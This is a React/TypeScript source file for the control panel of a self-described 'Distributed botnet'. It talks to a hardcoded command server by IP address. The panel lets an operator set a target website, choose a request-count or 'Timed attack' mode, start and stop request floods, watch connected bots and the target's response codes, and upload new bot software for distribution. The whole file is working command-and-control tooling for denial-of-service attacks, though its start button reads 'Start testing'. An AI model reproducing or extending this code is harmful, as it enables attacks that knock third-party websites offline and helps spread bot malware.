import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import {
  BarChart,
  Bar,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  ResponsiveContainer,
} from "recharts";
import {
  FormControl,
  FormLabel,
  Switch,
  Badge,
  Button,
  Input,
  Code,
  Radio,
} from "@vechaiui/react";

const Panel = () => {
  const navigate = useNavigate();
  const inputFileRef = useRef<HTMLInputElement>(null);

  const serverUrl = "http://3.87.247.112:5000";

  const [time, setTime] = useState(0);
  const [serverTarget, setServerTarget] = useState("");
  const [serverMode, setServerMode] = useState("");
  const [serverTime, setServerTime] = useState("");
  const [serverRequests, setServerRequests] = useState("");
  const [type, setType] = useState(1);
  const [inputValue, setInputValue] = useState(0);
  const [requestsNum, setRequestsNum] = useState(100);
  const [timeNum, setTimeNum] = useState(0);
  const [active, setActive] = useState(false);
  const [running, setRunning] = useState(false);
  const [target, setTarget] = useState("");
  const [activeBots, setActiveBots] = useState([]);
  const [botsStats, setBotsStats] = useState([]);
  const [responses, setResponses] = useState<number[]>([]);
  const [graphData, setGraphData] = useState<Object[]>([]);
  const [visible, setVisible] = useState(false);

  let intervalTimer: NodeJS.Timer;
  let intervalActivity: NodeJS.Timer;

  const logout = () => {
    localStorage.removeItem("password");
    navigate("/login");
  };

  const changeServerStatus = async (serverUrl: string, status: boolean) => {
    const changeServerStatusEndpoint: string = "/setServerStatus";

    const statusObject = {
      status: status,
    };

    try {
      await axios.post(serverUrl + changeServerStatusEndpoint, statusObject);
      setActive(status);
    } catch (err) {
      console.log({
        message: "Status setting failed.",
        errorInfo: err,
      });
    }
  };

  const setRequestsNumber = async (requestsNum: number) => {
    const setRequestsNumberEndpoint: string = "/setRequestsNumber";

    const requestsNumObject = {
      requestsNumber: requestsNum,
    };

    try {
      await axios.post(
        serverUrl + setRequestsNumberEndpoint,
        requestsNumObject
      );
    } catch (err) {
      console.log({
        message: "Requests number setting failed.",
        errorInfo: err,
      });
    }
  };

  const setTimeSeconds = async (time: number) => {
    const setTimeSecondsEndpoint: string = "/setTimeSeconds";

    const timeSecondsObject = {
      timeSeconds: time,
    };

    try {
      await axios.post(serverUrl + setTimeSecondsEndpoint, timeSecondsObject);
    } catch (err) {
      console.log({
        message: "Requests number setting failed.",
        errorInfo: err,
      });
    }
  };

  const setMode = async (mode: number) => {
    setType(mode);
    const setModeEndpoint: string = "/setMode";

    const modeObject = {
      mode: mode === 2 ? "timeMode" : "requestMode",
    };

    try {
      await axios.post(serverUrl + setModeEndpoint, modeObject);
    } catch (err) {
      console.log({
        message: "Number setting failed.",
        errorInfo: err,
      });
    }
  };

  const changeTarget = async (serverUrl: string, target: string) => {
    const changeTargetEndpoint: string = "/changeTarget";

    const targetObject = {
      target: target,
    };

    try {
      await axios.post(serverUrl + changeTargetEndpoint, targetObject);
    } catch (err) {
      console.log({
        message: "Target setting failed.",
        errorInfo: err,
      });
    }
  };

  const getActiveBots = async (serverUrl: string) => {
    const getActiveBotsEndpoint = "/getConnectedBots";
    try {
      const response = await axios.get(serverUrl + getActiveBotsEndpoint);
      const responseData = response.data;
      const { connectedBots } = responseData;

      setActiveBots(connectedBots);
      console.log(responseData);
    } catch (err) {
      console.log(err);
    }
  };

  const getBotsStats = async (serverUrl: string, responses: number[]) => {
    const getBotsStatsEndpoint = "/getBotsStats";
    try {
      const response = await axios.get(serverUrl + getBotsStatsEndpoint);
      const responseData = response.data;

      setBotsStats(responseData.stats.reverse());
      console.log(responseData.stats);
      const statusCodes: number[] = [];
      responseData.stats.forEach((resp: any) => {
        if (
          new Date().getTime() - new Date(resp.ResponseTime).getTime() <
          10000000
        ) {
          statusCodes.push(...resp.Status);
        }
      });
      setResponses(statusCodes);
      setGraphData(parseStatsData(statusCodes));
    } catch (err) {
      console.log(err);
    }
  };

  const parseStatsData = (responseList: number[]) => {
    const data: {
      statusCode: string;
      amount: number;
    }[] = [];

    const countCodes = responseList.reduce(
      (acc: any, curr: any) => ((acc[curr] = (acc[curr] || 0) + 1), acc),
      {}
    );
    for (const status of Object.keys(countCodes)) {
      data.push({
        statusCode: status,
        amount: countCodes[status],
      });
    }

    return data;
  };

  const startBotnet = (
    serverUrl: string,
    requestsNum: number,
    time: number,
    target: string
  ) => {
    setRunning(true);
    setResponses([]);
    changeServerStatus(serverUrl, true);
    changeTarget(serverUrl, target);
    getActiveBots(serverUrl);
  };

  const stopBotnet = (serverUrl: string) => {
    changeServerStatus(serverUrl, false);
    setTime(0);
    setRunning(false);
    setActiveBots([]);
    setBotsStats([]);
  };

  const uploadFile = async (file: any) => {
    const formData = new FormData();
    formData.append("file", file);
    const uploadFileEndpoint = "/uploadFile";
    try {
      const response = await axios.post(
        serverUrl + uploadFileEndpoint,
        formData
      );
      return response.data.filepath;
    } catch (e) {
      console.error(e);
    }
  };

  const updateSoftware = async (selectedFile: any) => {
    const link = await uploadFile(selectedFile);
    const updateSoftwareEndpoint = "/setBotVersionInfo";
    const softwareObject = {
      botVersionName: selectedFile.name.split('.')[0],
      botFileUrl: link,
    };
    try {
      await axios.post(serverUrl + updateSoftwareEndpoint, softwareObject);
    } catch (e) {
      console.error(e);
    }
  };

  const changeHandler = (event: any) => {
    updateSoftware(event.target.files[0]);
  };

  const getServerInfo = async (serverUrl: string) => {
    const getTargetInfoEndoint = "/getTargetInfo";
    try {
      const response = await axios.get(serverUrl + getTargetInfoEndoint);
      const responseData = response.data;
      setServerMode(responseData.mode);
      setServerTarget(responseData.targetUrl);
      setServerTime(responseData.timeSeconds);
      setServerRequests(responseData.requestNum);
      console.log(responseData);
    } catch (err) {
      console.error(err);
    }
  };

  useEffect(() => {
    setInterval(() => {
      getServerInfo(serverUrl);
    }, 3000);
  }, []);

  useEffect(() => {
    if (active) {
      intervalTimer = setInterval(() => {
        setTime((prevTime) => prevTime + 10);
      }, 10);

      intervalActivity = setInterval(() => {
        getActiveBots(serverUrl);
        getBotsStats(serverUrl, responses);
      }, 10000);
    } else if (!active) {
      clearInterval(intervalTimer);
      clearInterval(intervalActivity);
    }

    return () => {
      clearInterval(intervalTimer);
      clearInterval(intervalActivity);
    };
  }, [active]);

  useEffect(() => {
    if (!localStorage.getItem("password")) {
      navigate("/login");
    } else {
      setVisible(true);
    }
  }, [navigate]);

  if (!visible) return null;

  return (
    <div>
      <div className="mt-8 mx-20 mb-10 ">
        <div className="flex justify-between">
          <div className="w-full flex flex-col">
            <h1 className="text-3xl font-bold text-gray-700">
              Distributed botnet
            </h1>
            <p className="text-gray-400 mb-8">version 2.0.1</p>
          </div>
          <Button className="mt-2" onClick={logout}>
            Exit
          </Button>
        </div>
        <div style={{ height: "75vh" }} className="w-full flex">
          <div className="flex flex-col w-1/2">
            <div style={{ height: "40%" }} className="mb-5">
              <p className="text-gray-500 text-base mb-3">Give the target:</p>
              <div className="w-5/6">
                <Input
                  onChange={(e) => {
                    setTarget(e.target.value);
                  }}
                  placeholder="http://indrekis2.blogspot.com/"
                />
              </div>
              <div className="flex items-center gap-5 w-5/6 mt-8">
                <p className="text-sm font-bold text-gray-800 mr-2">
                  Choose mode:
                </p>
                <Radio
                  name="basic"
                  defaultChecked
                  onChange={() => {
                    setMode(1);
                  }}
                >
                  Requests amount
                </Radio>
                <Radio
                  name="basic"
                  onChange={() => {
                    setMode(2);
                  }}
                >
                  Timed attack
                </Radio>
              </div>
              <div className="flex gap-5 mt-3 mb-3 items-center ">
                <FormControl id="email" className=" flex flex-col ">
                  <FormLabel>{"Requests amount"}</FormLabel>
                  <Input
                    placeholder="> 100"
                    onChange={(e) => {
                      setRequestsNum(
                        isNaN(parseInt(e.target.value))
                          ? 0
                          : parseInt(e.target.value)
                      );
                    }}
                    required
                  />
                </FormControl>
                <FormControl id="email" className=" flex flex-col ">
                  <FormLabel>{"Time amount (sec)"}</FormLabel>
                  <Input
                    placeholder="20"
                    onChange={(e) => {
                      setTimeNum(
                        isNaN(parseInt(e.target.value))
                          ? 0
                          : parseInt(e.target.value)
                      );
                      setTime(
                        isNaN(parseInt(e.target.value))
                          ? 0
                          : parseInt(e.target.value) * 1000
                      );
                    }}
                    required
                  />
                </FormControl>
                <FormControl className="flex flex-col ">
                  <FormLabel htmlFor="server-active" className="mb-0 mr-2">
                    Set server active
                  </FormLabel>
                  <Switch
                    className="mt-3"
                    id="server-active"
                    checked={active}
                    onChange={() => changeServerStatus(serverUrl, !active)}
                  />
                </FormControl>
                <div className="flex flex-col">
                  <div className="w-1/2 flex ">
                    <Button
                      onClick={() => {
                        changeTarget(serverUrl, target);
                      }}
                    >
                      Change target
                    </Button>
                    <Button
                      onClick={() => {
                        setTimeSeconds(timeNum);
                      }}
                    >
                      Change time
                    </Button>
                  </div>
                  <div className="flex w-1/2">
                    <Button
                      onClick={() => {
                        setRequestsNumber(requestsNum);
                      }}
                    >
                      Change requests amount
                    </Button>
                    <Button
                      onClick={() => {
                        startBotnet(serverUrl, requestsNum, time, target);
                      }}
                      variant="solid"
                      color="primary"
                      disabled={active}
                    >
                      Start testing
                    </Button>
                  </div>
                </div>
              </div>
            </div>
            <div className="bg-gray-100 rounded overflow-scroll p-3 flex flex-col h-1/2">
              <p className="text-gray-500 text-base mb-3">Bots response log:</p>

              {botsStats.length !== 0
                ? botsStats.map((response: any) => {
                    if (
                      new Date().getTime() -
                        new Date(response.ResponseTime).getTime() <
                      100000
                    ) {
                      return (
                        <Code className="flex flex-col justify-start items-start">
                          <p>TIME: {response.ResponseTime}</p>
                          <p>TARGET: {response.Target}</p>
                          <p>STATUS: {JSON.stringify(response.Status)}</p>
                        </Code>
                      );
                    }
                  })
                : "No information retrieved yet"}
            </div>
          </div>
          <div className="flex-col w-1/2">
            <div className="h-1/3">
              <div className="flex justify-between items-center mb-3">
                <div className="flex items-center gap-2">
                  <p className="text-gray-500 text-base">Connected bots</p>
                  <Badge>{activeBots.length}</Badge>
                </div>
                <Button
                  onClick={() => {
                    if (inputFileRef.current != null) {
                      inputFileRef.current.click();
                    }
                  }}
                >
                  Upload bot software
                  <input
                    ref={inputFileRef}
                    type={"file"}
                    onChange={changeHandler}
                  />
                </Button>
              </div>
              <div>
                {activeBots.length !== 0 ? (
                  activeBots.map((bot: string) => (
                    <div className="bg-gray-100 h-8 flex items-center p-3 mb-1 rounded">
                      <p className="text-gray-700 blur-[5px] hover:blur-none font-medium text-base ">
                        {bot}
                      </p>
                    </div>
                  ))
                ) : (
                  <p className="text-gray-400  font-normal mt-5 text-center">
                    No bots connected
                  </p>
                )}
              </div>
            </div>
            <div className="bg-gray-100 rounded ml-2 h-3/5 p-3">
              <p className="text-gray-500 text-base mb-3">Requests stats</p>
              {graphData.length === 0 ? (
                <p className="mt-5">No information retrieved yet</p>
              ) : (
                <ResponsiveContainer>
                  <BarChart
                    data={graphData}
                    margin={{
                      top: 5,
                      right: 30,
                      left: 20,
                      bottom: 25,
                    }}
                    barSize={30}
                  >
                    <XAxis
                      dataKey="statusCode"
                      scale="point"
                      padding={{ left: 10, right: 10 }}
                    />
                    <YAxis />
                    <Tooltip />
                    <CartesianGrid strokeDasharray="3 3" />
                    <Bar
                      dataKey="amount"
                      fill="#14B8A6"
                      background={{ fill: "#eee" }}
                    />
                  </BarChart>
                </ResponsiveContainer>
              )}
            </div>
          </div>
        </div>
      </div>
      <div className="h-20 w-full fixed bottom-0 flex items-center justify-around bg-gray-100">
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Target:</p>
          <p className="text-gray-600 text-sm font-medium">
            {serverTarget ? serverTarget : "Not defined"}
          </p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Status:</p>
          {active ? (
            <p className="text-green-400 text-sm font-medium">Active</p>
          ) : (
            <p className="text-red-400 text-sm font-medium">Disabled</p>
          )}
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Requests sent:</p>
          <p className="text-gray-700 text-sm font-medium">
            {responses.length}
          </p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Requests:</p>
          <p className="text-gray-700 text-sm font-medium">{serverRequests}</p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Time:</p>
          <p className="text-gray-700 text-sm font-medium">{serverTime}</p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Mode:</p>
          <p className="text-gray-700 text-sm font-medium">{serverMode}</p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm flex items-center">
            Time elapsed:
          </p>
          <p className="text-4xl font-bold text-gray-600 bottom-0">
            <div className="numbers">
              <span>{("0" + Math.floor((time / 60000) % 60)).slice(-2)}:</span>
              <span>{("0" + Math.floor((time / 1000) % 60)).slice(-2)}</span>
            </div>
          </p>
        </div>

        <Button
          onClick={() => {
            stopBotnet(serverUrl);
          }}
          variant="solid"
          className="w-20"
        >
          Stop
        </Button>
      </div>
    </div>
  );
};

export default Panel;
